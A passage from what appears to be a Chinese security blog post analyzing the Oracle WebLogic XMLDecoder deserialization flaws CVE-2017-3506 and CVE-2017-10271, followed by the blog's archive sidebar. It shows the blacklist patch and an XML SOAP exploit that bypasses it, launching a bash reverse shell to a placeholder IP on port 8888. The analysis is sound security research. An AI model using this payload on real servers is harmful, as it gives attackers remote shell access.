WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler()</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> SAXException</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ParserConfigurationException e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (SAXException e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在反序列化之前增加了一个validate方法，假如qName为object就异常终止程序。但是这种黑名单式的检测，并没有彻底修复，于是用以下Exp可以成功bypass。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash -i &amp;gt; /dev/tcp/xxx.xxx.xxx.xxx/8888 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是在10月份的补丁中，该漏洞已被修复。</p>
+<hr>
+<h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><p><a href="http://whip1ash.cn/2018/10/21/weblogic-deserialization/#CVE-2017-3506-amp-CVE-2017-10271" target="_blank" rel="noopener">从0开始学习WebLogic(Java)反序列化 (1)</a></p>
+<p><a href="https://www.secfree.com/article-635.html" target="_blank" rel="noopener">【漏洞预警】Oracle WebLogic wls-wsat RCE CVE-2017-10271 &amp; CVE-2017-3506</a></p>
+<p><a href="https://www.secpulse.com/archives/66572.html" target="_blank" rel="noopener">关于近期发生的利用weblogic漏洞进行挖矿事件的漏洞简要分析</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/32301092" target="_blank" rel="noopener">CVE-2017-3506 &amp; 10271：Weblogic 远程代码执行漏洞分析及复现笔记</a></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/03/deserialize/" title= "Java反序列化漏洞实践利用学习-(2)">
+                    <div class="nextTitle">Java反序列化漏洞实践利用学习-(2)</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/10/27/Yoga/" title= "Hexo入坑记">
+                    <div class="prevTitle">Hexo入坑记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto://yujianan1998@gmail.com" target="_blank" rel="noopener" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Yoga7xm" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞编号：CVE-2017-3506-amp-CVE-2017-10271-（wls-wsat-远程命令执行绕过漏洞）"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞编号：CVE-2017-3506 &amp; CVE-2017-10271 （wls-wsat 远程命令执行绕过漏洞）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-测试环境搭建"><span class="toc-number">4.</span> <span class="toc-text">0x03 测试环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-测试POC"><span class="toc-number">5.</span> <span class="toc-text">0x04 测试POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-复现及分析过程"><span class="toc-number">6.</span> <span class="toc-text">0x05 复现及分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><span class="toc-number">6.1.</span> <span class="toc-text">weblogic.wsee.jaxws.workcontext.WorkContextServerTube</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-wsee-jaxws-workcontext-WorkContextTube"><span class="toc-number">6.2.</span> <span class="toc-text">weblogic.wsee.jaxws.workcontext.WorkContextTube</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter"><span class="toc-number">6.3.</span> <span class="toc-text">weblogic.wsee.workarea.WorkContextXmlInputAdapter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-漏洞起因及补丁"><span class="toc-number">7.</span> <span class="toc-text">0x06 漏洞起因及补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考链接"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 47
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/2019/09/30/http/" >HTTP 请求走私</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2019/09/02/rmi/" >RMI 反序列化漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/com/" >Commons-Collections 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2019/07/30/jackson/" >Jackson 反序列化漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2019/07/20/fastjson/" >Fastjson 反序列化漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/23</span><a class="archive-post-title" href= "/2019/06/23/met1/" >Metinfo6.13 两处XSS漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/2019/06/14/suid/" >Linux Suid提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2019/06/06/phpbb/" >phpBB 反序列化漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2019/06/04/phar/" >PHP反序列化之phar</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2019/06/01/typecho/" >Typecho 反序列化RCE漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2019/05/28/rfi-getshell/" >RFI Getshell By SMB & WebDav</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/20</span><a class="archive-post-title" href= "/2019/05/20/basedir/" >Open_basedir Bypass</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2019/05/15/disable/" >disable_funcions Bypass</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "/2019/05/10/cs2msf/" >CS shell 与 Msf session 转换</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2019/04/29/lPentest-domain/" >内网渗透--横向移动(委派与中继)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2019/04/23/IPentest-domain4/" >内网渗透--横向移动(SPN攻击)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2019/04/19/lPentest-domain2/" >内网渗透--票据传递</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2019/04/12/IPentest-domain3/" >内网渗透--Hash传递攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/IPentest-admin/" >内网渗透--本机提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href= "/2019/03/31/IPentest-tunnel/" >内网渗透--通信隧道</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2019/03/27/IPentest-discover/" >内网渗透--内网探测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2019/03/24/IPentest-base/" >内网渗透--基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2019/03/21/tp/" >Thinkphp5 RCE漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2019/02/20/cors/" >CORS & Jsonp Hijacking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span><a class="archive-post-title" href= "/2019/02/15/freshly/" >Vunlhub之freshly</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href= "/2019/02/02/redis/" >浅谈Redis未授权攻击方式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2019/01/23/leaks/" >Vulnhub之FristiLeaks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/2019/01/15/box/" >Vulnhub之Billu_b0x</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2019/01/10/born2boot/" >Vulnhub之born2boot</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/04</span><a class="archive-post-title" href= "/2019/01/04/Lazysysadmin/" >Vulnhub之Lazysysadmin</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2018/12/24/cryptology/" >分组密码工作模式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/2018/12/18/Wakanda/" >Vulnhub之Wakanda</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2018/12/14/bulldog/" >Vulnhub之bulldog</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2018/12/07/YFCTF/" >YFCTF协议分析WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span><a class="archive-post-title" href= "/2018/12/03/sqlilab/" >sqli-lab(54-65)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/2018/12/02/sqlila/" >sqli-lab(38-53)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2018/12/01/sqlil/" >sqli-lab(23-37)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href= "/2018/11/30/sqli/" >sqli-lab(1-22)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href= "/2018/11/28/Git-study/" >Git-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/NCTF/" >NCTF-2018 WriteUp web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2018/11/20/xxe-study/" >XXE Study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/cg-ctf/" >CG-CTF WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/ssrf-study/" >SSRF Study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/bar-ctf/" >实验吧CTF---WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2018/11/03/deserialize/" >Java反序列化漏洞实践利用学习-(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2018/10/30/web/" >记Weblogic反序列化的一次学习-(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/Yoga/" >Hexo入坑记</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="blog"><span class="iconfont-archer">&#xe606;</span>blog</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+    
+        <span class="sidebar-tag-name" data-tags="deserialize"><span class="iconfont-archer">&#xe606;</span>deserialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="CORS"><span class="iconfont-archer">&#xe606;</span>CORS</span>
+    
+        <span class="sidebar-tag-name" data-tags="JSONP"><span class="iconfont-archer">&#xe606;</span>JSONP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="unserializable"><span class="iconfont-archer">&#xe606;</span>unserializable</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="未授权"><span class="iconfont-archer">&#xe606;</span>未授权</span>
+    
+        <span class="sidebar-tag-name" data-tags="RFI"><span class="iconfont-archer">&#xe606;</span>RFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="unserialize"><span class="iconfont-archer">&#xe606;</span>unserialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
+    
+        <span class="sidebar-tag-name" data-tags="cryptology"><span class="iconfont-archer">&#xe606;</span>cryptology</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Yoga7xm"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
